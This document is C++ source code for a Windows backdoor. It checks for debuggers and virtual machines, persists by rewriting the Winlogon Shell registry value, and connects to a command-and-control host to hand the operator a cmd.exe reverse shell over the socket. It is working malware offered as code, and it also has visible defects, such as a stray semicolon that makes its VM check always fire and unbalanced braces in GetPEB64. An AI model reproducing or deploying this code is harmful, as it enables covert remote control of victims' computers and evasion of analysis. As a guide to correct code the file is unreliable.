#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define DEFAULT_BUFLEN 1024
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define IS_BEING_DEBUGGED_FLAG (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
#define ATOM_NAME L"1M_T1RED"

#include <winsock2.h>
#include <winternl.h>
#include <winreg.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "ntdll.lib")

#pragma warning (disable : 4996) 
WORD getVersionWord()
{
    OSVERSIONINFO pVerInfo = { sizeof(OSVERSIONINFO) };

    GetVersionEx(&pVerInfo);

    return MAKEWORD(pVerInfo.dwMinorVersion, pVerInfo.dwMajorVersion);
}


BOOL isWindows8orHigher()
{
    return getVersionWord() >= _WIN32_WINNT_WIN8;
}

BOOL isWindowsVistaOrHigher()
{
    return getVersionWord() >= _WIN32_WINNT_VISTA;
}

PVOID GetPEB()
{
#ifdef _WIN64
    return (PVOID)__readgsqword(0x0c * sizeof(PVOID));
#else
    return (PVOID)__readfsdword(0x0c * sizeof(PVOID));
#endif
}

PVOID GetPEB64()
{
    PVOID pPeb = 0;
#ifndef  _WIN64
    if (isWindows8orHigher())
    {
        if (isWindows8orHigher())
        {
            BOOL isWow64 = FALSE;
            typedef BOOL(WINAPI* pfnIsWow64Process)(HANDLE hProcess, PBOOL isWow64);
            
            pfnIsWow64Process fnIsWow64Process = (pfnIsWow64Process)
                GetProcAddress(GetModuleHandle("Kernel32.dll"), "IsWow64Process");

            if (fnIsWow64Process(GetCurrentProcess(), &isWow64)
            {
                if (isWow64)
                {
                    pPeb = (PVOID)__readfsdword(0x0c * sizeof(PVOID));
                        pPeb = (PVOID)((PBYTE)pPeb + 0x1000);
                }
            }

    }
#endif // ! _WIN64
        return pPeb;
}

void checkIfBeingDebugged()
{
    if (FindWindowA(NULL, "OLLYDBG") != NULL)
    {
        exit(-1);
    }
    
    PVOID pPeb = GetPEB();
    PVOID pPeb64 = GetPEB64();

    DWORD offsetNtGlobalFlag = 0;

#ifdef _WIN64
    offsetNtGlobalFlag = 0xbc;
#else
    offsetNtGlobalFlag = 0x68;
#endif

    DWORD NtGlobalFlag = *(PDWORD)((PBYTE)pPeb + offsetNtGlobalFlag);

    if (NtGlobalFlag & IS_BEING_DEBUGGED_FLAG)
    {
        exit(0);
    }
    if (pPeb64)
    {
        DWORD NtGlobalFlagWow64 = *(PDWORD)((PBYTE)pPeb64 + 0xbc);

        if (NtGlobalFlagWow64 & IS_BEING_DEBUGGED_FLAG)
        {
            exit(0);
        }
    }
}

boolean vmStr(const WCHAR* str)
{
    boolean flag = false;

    if (!_wcsicmp(str, L"Vmtoolsd.exe") ||
        !_wcsicmp(str, L"Vmwaretrat.exe") ||
        !_wcsicmp(str, L"Vmwareuser.exe") ||
        !_wcsicmp(str, L"Vmacthlp.exe") ||
        !_wcsicmp(str, L"vboxservice.exe") ||
        !_wcsicmp(str, L"vboxtray.exe"));
    {
        flag = true;
    }

    return flag;
}

void antiVm()
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (vmStr(procEntry.szExeFile))
                {
                    exit(0);
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }

    CloseHandle(hSnap);
}


#pragma warning (default : 4996) 
void winlogonPersistence()
{
    //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell


    HKEY key;
    
    if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), &key) != ERROR_SUCCESS)
    {
        printf("Unable to open key\n");
    }

    LPWSTR checkBuf = NULL;

    if (RegQueryValue(key, TEXT("Shell"), checkBuf, (PLONG)MAX_PATH) != ERROR_SUCCESS)
    {
        printf("Unable to Query value\n");
    };


    wchar_t newVal[15 + MAX_PATH] = L"explorer.exe, ";
    wchar_t path[MAX_PATH];

    GetModuleFileName(NULL, path, MAX_PATH);

    wcscat(newVal, path);

    if (wcscmp(checkBuf, newVal))
    {
        if (RegSetValueEx(key, TEXT("Shell"), 0, REG_SZ, (LPBYTE)newVal, wcslen(newVal) * sizeof(wchar_t)) != ERROR_SUCCESS)
        {
            std::wcout << L"Error opening key: " << TEXT("Shell") << std::endl;
        }

        RegCloseKey(key);
    }
}

void sendM(char c[], int port, const char* host)
{
    SOCKET mainSock;
    sockaddr_in addr;
    WSADATA version;

    WSAStartup(MAKEWORD(2, 2), &version);
    mainSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);

    if ((WSAConnect(mainSock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR))
    {
        closesocket(mainSock);
        WSACleanup();
    }
    else
    {
        send(mainSock, (const char*)c, strlen(c) + 1, 0);
    }
}

void commandAndControl(const char* host, int port)
{
    while (true)
    {
        SOCKET mainSock;
        sockaddr_in addr;
        WSADATA version;

        WSAStartup(MAKEWORD(2, 2), &version);
        mainSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(host);
        addr.sin_port = htons(port);

        if ((WSAConnect(mainSock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR))
        {
            closesocket(mainSock);
            WSACleanup();
            continue;
        }
        else
        {
            char recvData[DEFAULT_BUFLEN];
            memset(recvData, 0, sizeof(recvData));
            int recvCode = recv(mainSock, recvData, DEFAULT_BUFLEN, 0);
            if (recvCode <= 0)
            {
                closesocket(mainSock);
                WSACleanup();
                continue;
            }
            else
            {
                while (true)
                {
                    send(mainSock, ">>", strlen(">>"), 0);
                    recvCode = recv(mainSock, recvData, DEFAULT_BUFLEN, 0);

                    if (!strcmp(recvData, "shell\n"))
                    {
                        wchar_t proc[] = L"cmd.exe";
                        STARTUPINFO strtpInfo;
                        PROCESS_INFORMATION procInfo;
                        memset(&strtpInfo, 0, sizeof(strtpInfo));
                        strtpInfo.cb = sizeof(strtpInfo);
                        strtpInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        strtpInfo.hStdInput = strtpInfo.hStdError = strtpInfo.hStdOutput = (HANDLE)mainSock;
                        CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &strtpInfo, &procInfo);
                        WaitForSingleObject(procInfo.hProcess, INFINITE);
                        CloseHandle(procInfo.hProcess);
                        CloseHandle(procInfo.hThread);
                        memset(recvData, 0, sizeof(recvData));
                        int recvCode = recv(mainSock, recvData, DEFAULT_BUFLEN, 0);
                        
                        if (recvCode <= 0)
                        {
                            std::cout << "Failed To recv 2";
                            closesocket(mainSock);
                            WSACleanup();
                            continue;
                        }

                        if (!strcmp(recvData, "exit\n")) exit(0);
                    }


                }
            }
        }
    }
}

boolean atomCheck()
{
    if ((GlobalFindAtom(ATOM_NAME)) == 0)
    {
        GlobalAddAtom(ATOM_NAME);

        return false;
    }

    return true;
}

int main()
{
    atomCheck();

    checkIfBeingDebugged();
    antiVm();

    
    WSADATA version;

    WSAStartup(MAKEWORD(2, 2), &version);
 
    hostent *hostInfo = gethostbyname("blablanonexistanthostblabla12345678910.com");
    
    
    winlogonPersistence();
    
    commandAndControl(hostInfo->h_addr_list[0], 1338);

    DebugActiveProcess(GetCurrentProcessId());
    
    

	return 0;
}
